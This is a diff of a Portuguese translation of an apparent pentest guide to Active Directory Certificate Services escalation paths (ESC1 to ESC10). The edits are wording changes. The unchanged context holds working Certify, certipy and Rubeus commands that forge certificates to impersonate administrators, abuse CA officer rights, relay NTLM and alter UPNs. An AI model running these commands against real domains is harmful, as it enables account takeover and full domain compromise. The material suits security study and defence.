@@ -1,4 +1,4 @@
-# Escalação de Domínio AD CS
+# AD CS Escalation de Domínio
 
 <details>
 
@@ -45,14 +45,14 @@ Para **abusar dessa vulnerabilidade para se passar por um administrador**, pode-
 Certify.exe request /ca:dc.theshire.local-DC-CA /template:VulnTemplate /altname:localadmin
 certipy req 'corp.local/john:Passw0rd!@ca.corp.local' -ca 'corp-CA' -template 'ESC1' -alt 'administrator@corp.local'
 ```
-Então você pode transformar o **certificado gerado para o formato `.pfx`** e usá-lo para **autenticação usando Rubeus ou certipy** novamente:
+Então, você pode transformar o **certificado gerado para o formato `.pfx`** e usá-lo para **autenticação usando Rubeus ou certipy** novamente:
 ```bash
 Rubeus.exe asktgt /user:localdomain /certificate:localadmin.pfx /password:password123! /ptt
 certipy auth -pfx 'administrator.pfx' -username 'administrator' -domain 'corp.local' -dc-ip 172.16.19.100
 ```
-Os binários do Windows "Certreq.exe" e "Certutil.exe" podem ser abusados para gerar o PFX: https://gist.github.com/b4cktr4ck2/95a9b908e57460d9958e8238f85ef8ee
+Os binários do Windows "Certreq.exe" e "Certutil.exe" podem ser usados para gerar o PFX: https://gist.github.com/b4cktr4ck2/95a9b908e57460d9958e8238f85ef8ee
 
-Além disso, a seguinte consulta LDAP, quando executada no esquema de configuração da floresta AD, pode ser usada para **enumerar modelos de certificado** que não exigem aprovação/assinaturas, que possuem um EKU de **Autenticação do Cliente ou Logon de Smart Card** e têm a flag **`CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT`** habilitada:
+Além disso, a seguinte consulta LDAP, quando executada no esquema de configuração da floresta AD, pode ser usada para **enumerar** **modelos de certificado** que não exigem aprovação/assinaturas, que possuem um EKU de **Autenticação do Cliente ou Logon de Smart Card**, e têm a flag **`CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT`** habilitada:
 ```
 (&(objectclass=pkicertificatetemplate)(!(mspki-enrollmentflag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-rasignature=*)))(|(pkiextendedkeyusage=1.3.6.1.4.1.311.20.2.2)(pkiextendedkeyusage=1.3.6.1.5.5.7.3.2)(pkiextendedkeyusage=1.3.6.1.5.2.3.4)(pkiextendedkeyusage=2.5.29.37.0)(!(pkiextendedkeyusage=*)))(mspkicertificate-name-flag:1.2.840.113556.1.4.804:=1))
 ```
@@ -62,13 +62,13 @@ Além disso, a seguinte consulta LDAP, quando executada no esquema de configura�
 
 O segundo cenário de abuso é uma variação do primeiro:
 
-1. O CA da empresa concede direitos de inscrição a usuários com baixo privilégio.
-2. A aprovação do gerente está desativada.
+1. O CA da empresa concede direitos de inscrição a usuários de baixo privilégio.
+2. A aprovação do gerente é desativada.
 3. Nenhuma assinatura autorizada é necessária.
-4. Um descritor de segurança de modelo de certificado excessivamente permissivo concede direitos de inscrição de certificado a usuários com baixo privilégio.
+4. Um descritor de segurança de modelo de certificado excessivamente permissivo concede direitos de inscrição de certificado a usuários de baixo privilégio.
 5. **O modelo de certificado define o EKU de qualquer finalidade ou nenhum EKU.**
 
-O **EKU de qualquer finalidade** permite que um invasor obtenha um **certificado** para **qualquer finalidade**, como autenticação de cliente, autenticação de servidor, assinatura de código, etc. A mesma **técnica que para ESC3** pode ser usada para abusar disso.
+O **EKU de qualquer finalidade** permite que um invasor obtenha um **certificado** para **qualquer finalidade**, como autenticação de cliente, autenticação de servidor, assinatura de código, etc. A mesma **técnica usada para ESC3** pode ser usada para abusar disso.
 
 Um **certificado sem EKUs** - um certificado de CA subordinado - também pode ser abusado para **qualquer finalidade**, mas também pode **ser usado para assinar novos certificados**. Como tal, usando um certificado de CA subordinado, um invasor poderia **especificar EKUs ou campos arbitrários nos novos certificados.**
 
@@ -82,31 +82,31 @@ A seguinte consulta LDAP, quando executada no esquema de configuração da flore
 
 ### Explicação
 
-Este cenário é semelhante ao primeiro e ao segundo, mas **abusando** de um **EKU diferente** (Agente de Solicitação de Certificado) e **2 modelos diferentes** (portanto, tem 2 conjuntos de requisitos).
+Este cenário é semelhante ao primeiro e ao segundo, mas **abusando** de um **EKU diferente** (Agente de Solicitação de Certificado) e **2 modelos diferentes** (portanto, possui 2 conjuntos de requisitos).
 
 O **EKU do Agente de Solicitação de Certificado** (OID 1.3.6.1.4.1.311.20.2.1), conhecido como **Agente de Inscrição** na documentação da Microsoft, permite que um principal se **inscreva** para um **certificado** em **nome de outro usuário**.
 
-O **"agente de inscrição"** se inscreve em tal **modelo** e usa o **certificado resultante para co-assinar um CSR em nome do outro usuário**. Em seguida, **envia** o **CSR co-assinado** para a CA, se inscrevendo em um **modelo** que **permite "inscrever em nome de"**, e a CA responde com um **certificado pertencente ao "outro" usuário**.
+O **"agente de inscrição"** se inscreve em tal **modelo** e usa o **certificado resultante para co-assinar uma CSR em nome do outro usuário**. Em seguida, **envia** a **CSR co-assinada** para o CA, se inscrevendo em um **modelo** que **permite "inscrever em nome de"**, e o CA responde com um **certificado pertencente ao "outro" usuário**.
 
 **Requisitos 1:**
 
-1. A CA Enterprise permite que usuários com baixo privilégio tenham direitos de inscrição.
+1. O CA empresarial permite que usuários com baixo privilégio tenham direitos de inscrição.
 2. A aprovação do gerente está desativada.
-3. Não são necessárias assinaturas autorizadas.
+3. Nenhuma assinatura autorizada é necessária.
 4. Um descritor de segurança de modelo de certificado excessivamente permissivo permite que usuários com baixo privilégio tenham direitos de inscrição de certificado.
 5. O **modelo de certificado define o EKU do Agente de Solicitação de Certificado**. O OID do Agente de Solicitação de Certificado (1.3.6.1.4.1.311.20.2.1) permite solicitar outros modelos de certificado em nome de outros princípios.
 
 **Requisitos 2:**
 
-1. A CA Enterprise permite que usuários com baixo privilégio tenham direitos de inscrição.
+1. O CA empresarial permite que usuários com baixo privilégio tenham direitos de inscrição.
 2. A aprovação do gerente está desativada.
 3. **A versão do esquema do modelo é 1 ou é maior que 2 e especifica um Requisito de Emissão de Política de Aplicativo que requer o EKU do Agente de Solicitação de Certificado.**
 4. O modelo de certificado define um EKU que permite autenticação de domínio.
-5. As restrições do agente de inscrição não são implementadas na CA.
+5. As restrições do agente de inscrição não são implementadas no CA.
 
 ### Abuso
 
-Você pode usar [**Certify**](https://github.com/GhostPack/Certify) ou [**Certipy**](https://github.com/ly4k/Certipy) para abusar desse cenário:
+Você pode usar o [**Certify**](https://github.com/GhostPack/Certify) ou [**Certipy**](https://github.com/ly4k/Certipy) para abusar desse cenário:
 ```bash
 # Request an enrollment agent certificate
 Certify.exe request /ca:CORPDC01.CORP.LOCAL\CORP-CORPDC01-CA /template:Vuln-EnrollmentAgent
@@ -120,11 +120,11 @@ certipy req 'corp.local/john:Pass0rd!@ca.corp.local' -ca 'corp-CA' -template 'Us
 # Use Rubeus with the certificate to authenticate as the other user
 Rubeu.exe asktgt /user:CORP\itadmin /certificate:itadminenrollment.pfx /password:asdf
 ```
-As CAs empresariais podem **restringir** os **usuários** que podem **obter** um **certificado de agente de inscrição**, os modelos de inscrição de agente e em quais **contas** o agente de inscrição pode **agir em nome de** ao abrir o `certsrc.msc` `snap-in -> clicando com o botão direito no CA -> clicando em Propriedades -> navegando` até a guia "Agentes de Inscrição".
+As CAs empresariais podem **restringir** os **usuários** que podem **obter** um **certificado de agente de inscrição**, os modelos de inscrição de agente e em quais **contas** o agente de inscrição pode **agir em nome de** ao abrir `certsrc.msc` `snap-in -> clicando com o botão direito no CA -> clicando em Propriedades -> navegando` até a guia "Agentes de Inscrição".
 
-No entanto, a configuração padrão do CA é "**Não restringir agentes de inscrição**". Mesmo quando os administradores habilitam "Restringir agentes de inscrição", a configuração padrão é extremamente permissiva, permitindo que qualquer pessoa acesse todos os modelos de inscrição.
+No entanto, a configuração padrão do CA é "**Não restringir agentes de inscrição**". Mesmo quando os administradores habilitam "Restringir agentes de inscrição", a configuração padrão é extremamente permissiva, permitindo que todos tenham acesso a todos os modelos de inscrição como qualquer pessoa.
 
-## Controle de Acesso Vulnerável do Modelo de Certificado - ESC4
+## Controle de Acesso Vulnerável ao Modelo de Certificado - ESC4
 
 ### **Explicação**
 
@@ -146,9 +146,9 @@ Um exemplo de privesc como o anterior:
 
 <figure><img src="../../../.gitbook/assets/image (15) (2).png" alt=""><figcaption></figcaption></figure>
 
-ESC4 é quando um usuário tem privilégios de gravação sobre um modelo de certificado. Isso pode, por exemplo, ser abusado para sobrescrever a configuração do modelo de certificado para torná-lo vulnerável ao ESC1.
+ESC4 é quando um usuário tem privilégios de gravação sobre um modelo de certificado. Isso pode, por exemplo, ser abusado para sobrescrever a configuração do modelo de certificado para tornar o modelo vulnerável ao ESC1.
 
-Como podemos ver no caminho acima, apenas `JOHNPC` tem esses privilégios, mas nosso usuário `JOHN` tem a nova aresta `AddKeyCredentialLink` para `JOHNPC`. Como essa técnica está relacionada a certificados, também implementei esse ataque, conhecido como [Shadow Credentials](https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab). Aqui está uma pequena prévia do comando `shadow auto` do Certipy para recuperar o hash NT da vítima.
+Como podemos ver no caminho acima, apenas `JOHNPC` tem esses privilégios, mas nosso usuário `JOHN` tem a nova aresta `AddKeyCredentialLink` para `JOHNPC`. Como essa técnica está relacionada a certificados, também implementei esse ataque, conhecido como [Credenciais de Sombra](https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab). Aqui está uma pequena prévia do comando `shadow auto` do Certipy para recuperar o hash NT da vítima.
 
 <figure><img src="../../../.gitbook/assets/image (1) (2) (1).png" alt=""><figcaption></figcaption></figure>
 
@@ -182,7 +182,7 @@ Se um atacante com baixo privilégio puder obter **controle sobre qualquer um de
 Existe outro problema semelhante, descrito no [**post da CQure Academy**](https://cqureacademy.com/blog/enhanced-key-usage), que envolve a flag **`EDITF_ATTRIBUTESUBJECTALTNAME2`**. Como a Microsoft descreve, "**Se** essa flag estiver **definida** no CA, **qualquer solicitação** (incluindo quando o assunto é construído a partir do Active Directory®) pode ter **valores definidos pelo usuário** no **nome alternativo do assunto**".\
 Isso significa que um **atacante** pode se inscrever em **QUALQUER modelo** configurado para **autenticação de domínio** que também **permite que usuários não privilegiados** se inscrevam (por exemplo, o modelo de usuário padrão) e **obter um certificado** que nos permite **autenticar** como um administrador de domínio (ou **qualquer outro usuário/máquina ativa**).
 
-**Observação**: os **nomes alternativos** aqui são **incluídos** em um CSR por meio do argumento `-attrib "SAN:"` para `certreq.exe` (ou seja, "Pares de Nome Valor"). Isso é **diferente** do método para **abusar de SANs** em ESC1, pois **armazena informações da conta em um atributo de certificado em vez de uma extensão de certificado**.
+**Nota**: os **nomes alternativos** aqui são **incluídos** em um CSR por meio do argumento `-attrib "SAN:"` para `certreq.exe` (ou seja, "Pares de Nome Valor"). Isso é **diferente** do método para **abusar de SANs** em ESC1, pois **armazena informações da conta em um atributo de certificado em vez de uma extensão de certificado**.
 
 ### Abuso
 
@@ -212,7 +212,7 @@ Se você encontrar essa configuração em seu ambiente, você pode **remover est
 certutil -config "CA_HOST\CA_NAME" -setreg policy\EditFlags -EDITF_ATTRIBUTESUBJECTALTNAME2
 ```
 {% hint style="warning" %}
-Após as atualizações de segurança de maio de 2022, novos **certificados** terão uma **extensão de segurança** que **incorpora** a propriedade `objectSid` do **solicitante**. Para o ESC1, essa propriedade será refletida a partir do SAN especificado, mas com o **ESC6**, essa propriedade reflete o `objectSid` do **solicitante**, e não do SAN.\
+Após as atualizações de segurança de maio de 2022, novos **certificados** terão uma **extensão de segurança** que **incorpora** a propriedade **`objectSid` do solicitante**. Para ESC1, essa propriedade será refletida a partir do SAN especificado, mas com **ESC6**, essa propriedade reflete o **`objectSid` do solicitante**, e não do SAN.\
 Portanto, **para abusar do ESC6**, o ambiente deve ser **vulnerável ao ESC10** (Mapeamentos de Certificado Fracos), onde o **SAN é preferido sobre a nova extensão de segurança**.
 {% endhint %}
 
@@ -222,7 +222,7 @@ Portanto, **para abusar do ESC6**, o ambiente deve ser **vulnerável ao ESC10** 
 
 #### Explicação
 
-Uma autoridade de certificação em si tem um **conjunto de permissões** que protegem várias **ações da CA**. Essas permissões podem ser acessadas a partir do `certsrv.msc`, clicando com o botão direito em uma CA, selecionando Propriedades e mudando para a guia Segurança:
+Uma autoridade de certificação em si tem um **conjunto de permissões** que seguram várias **ações da CA**. Essas permissões podem ser acessadas a partir do `certsrv.msc`, clicando com o botão direito em uma CA, selecionando Propriedades e mudando para a guia Segurança:
 
 <figure><img src="../../../.gitbook/assets/image (73) (2).png" alt=""><figcaption></figcaption></figure>
 
@@ -244,7 +244,7 @@ Isso também é possível de forma mais simples com o cmdlet [**Enable-PolicyMod
 
 O direito **`ManageCertificates`** permite **aprovar uma solicitação pendente**, portanto, ignorando a proteção "aprovação do gerente de certificados da CA".
 
-Você pode usar uma **combinação** dos módulos **Certify** e **PSPKI** para solicitar um certificado, aprová-lo e baixá-lo:
+Você pode usar uma **combinação** do módulo **Certify** e **PSPKI** para solicitar um certificado, aprová-lo e baixá-lo:
 ```powershell
 # Request a certificate that will require an approval
 Certify.exe request /ca:dc.theshire.local\theshire-DC-CA /template:ApprovalNeeded
@@ -265,7 +265,7 @@ Certify.exe download /ca:dc.theshire.local\theshire-DC-CA /id:336
 #### Explicação
 
 {% hint style="warning" %}
-No **ataque anterior** **`Manage CA`**, as permissões foram usadas para **ativar** a flag **EDITF\_ATTRIBUTESUBJECTALTNAME2** e realizar o **ataque ESC6**, mas isso não terá efeito até que o serviço CA (`CertSvc`) seja reiniciado. Quando um usuário tem o direito de acesso `Manage CA`, o usuário também pode **reiniciar o serviço**. No entanto, isso **não significa que o usuário possa reiniciar o serviço remotamente**. Além disso, o **ataque ESC6 pode não funcionar** em ambientes mais atualizados devido às atualizações de segurança de maio de 2022.
+No **ataque anterior** **`Manage CA`**, as permissões foram usadas para **ativar** a flag **EDITF\_ATTRIBUTESUBJECTALTNAME2** e realizar o **ataque ESC6**, mas isso não terá efeito até que o serviço CA (`CertSvc`) seja reiniciado. Quando um usuário tem o direito de acesso `Manage CA`, o usuário também pode **reiniciar o serviço**. No entanto, isso **não significa que o usuário possa reiniciar o serviço remotamente**. Além disso, o **ESC6 pode não funcionar** em ambientes mais atualizados devido às atualizações de segurança de maio de 2022.
 {% endhint %}
 
 Portanto, outro ataque é apresentado aqui.
@@ -287,7 +287,7 @@ Certipy v4.0.0 - by Oliver Lyak (ly4k)
 
 [*] Successfully added officer 'John' on 'corp-DC-CA'
 ```
-O modelo **`SubCA`** pode ser **ativado no CA** com o parâmetro `-enable-template`. Por padrão, o modelo `SubCA` está ativado.
+O modelo **`SubCA`** pode ser **habilitado no CA** com o parâmetro `-enable-template`. Por padrão, o modelo `SubCA` está habilitado.
 ```bash
 # List templates
 certipy ca 'corp.local/john:Passw0rd!@ca.corp.local' -ca 'corp-CA' -enable-template 'SubCA'
@@ -313,7 +313,7 @@ Would you like to save the private key? (y/N) y
 [*] Saved private key to 785.key
 [-] Failed to request certificate
 ```
-Com o nosso **`Gerenciador de CA` e `Gerenciador de Certificados`**, podemos então **emitir a solicitação de certificado falha** com o comando `ca` e o parâmetro `-issue-request <ID da solicitação>`.
+Com o nosso **`Gerenciar CA` e `Gerenciar Certificados`**, podemos então **emitir o certificado falho** com o comando `ca` e o parâmetro `-issue-request <ID do pedido>`.
 ```bash
 certipy ca -ca 'corp-DC-CA' -issue-request 785 -username john@corp.local -password Passw0rd
 Certipy v4.0.0 - by Oliver Lyak (ly4k)
@@ -363,7 +363,7 @@ Outra limitação dos ataques de relé NTLM é que eles **exigem que uma conta d
 
 O comando `cas` do **Certify** pode enumerar os **endpoints HTTP do AD CS habilitados**: 
 
-**[Certify](https://github.com/GhostPack/Certify)**
+[**Certify**](https://github.com/GhostPack/Certify)
 ```
 Certify.exe cas
 ```
@@ -371,7 +371,7 @@ As Autoridades de Certificação Empresariais também armazenam os pontos de ext
 ```
 certutil.exe -enrollmentServerURL -config CORPDC01.CORP.LOCAL\CORP-CORPDC01-CA
 ```
-<figure><img src="../../../.gitbook/assets/image (2) (2) (2) (1).png" alt=""><figcaption>Figura 1: Fluxograma de Escalação de Domínio via Certificados</figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (2) (2) (2) (1).png" alt=""><figcaption>Figura: Exemplo de um certificado de domínio do Active Directory</figcaption></figure>
 ```powershell
 Import-Module PSPKI
 Get-CertificationAuthority | select Name,Enroll* | Format-List *
@@ -395,7 +395,7 @@ execute-assembly C:\SpoolSample\SpoolSample\bin\Debug\SpoolSample.exe <victim> <
 ```
 #### Abuso com [Certipy](https://github.com/ly4k/Certipy)
 
-Por padrão, o Certipy solicitará um certificado com base no modelo `Machine` ou `User`, dependendo se o nome da conta transmitida termina com `$`. É possível especificar outro modelo com o parâmetro `-template`.
+Por padrão, o Certipy solicitará um certificado com base no modelo `Máquina` ou `Usuário`, dependendo se o nome da conta transmitida termina com `$`. É possível especificar outro modelo com o parâmetro `-template`.
 
 Podemos então usar uma técnica como [PetitPotam](https://github.com/ly4k/PetitPotam) para coagir a autenticação. Para controladores de domínio, devemos especificar `-template DomainController`.
 ```
@@ -427,7 +427,7 @@ Neste caso, `John@corp.local` tem `GenericWrite` sobre `Jane@corp.local`, e quer
 
 Primeiro, obtemos o hash de `Jane` com, por exemplo, Shadow Credentials (usando nosso `GenericWrite`).
 
-<figure><img src="../../../.gitbook/assets/image (13) (1) (1) (1) (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (9).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (13) (1) (1) (1) (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (22).png" alt=""><figcaption></figcaption></figure>
 
 Em seguida, alteramos o `userPrincipalName` de `Jane` para ser `Administrator`. Observe que estamos deixando de fora a parte `@corp.local`.
 
@@ -439,7 +439,7 @@ Agora, solicitamos o modelo de certificado vulnerável `ESC9`. Devemos solicitar
 
 <figure><img src="../../../.gitbook/assets/image (16) (2).png" alt=""><figcaption></figcaption></figure>
 
-Observe que o `userPrincipalName` no certificado é `Administrator` e que o certificado emitido não contém um "object SID".
+Observe que o `userPrincipalName` no certificado é `Administrator` e que o certificado emitido não contém nenhum "object SID".
 
 Em seguida, alteramos novamente o `userPrincipalName` de `Jane` para ser algo diferente, como seu `userPrincipalName` original `Jane@corp.local`.
 
@@ -465,6 +465,4 @@ ESC10 refere-se a dois valores de chave de registro no controlador de domínio.
 
 **Caso 2**
 
-`CertificateMappingMethods` contém o bit `UPN` (`0x4`)
-
-### Abuso Caso
+`CertificateMappingMethods` contém o bit `UPN`
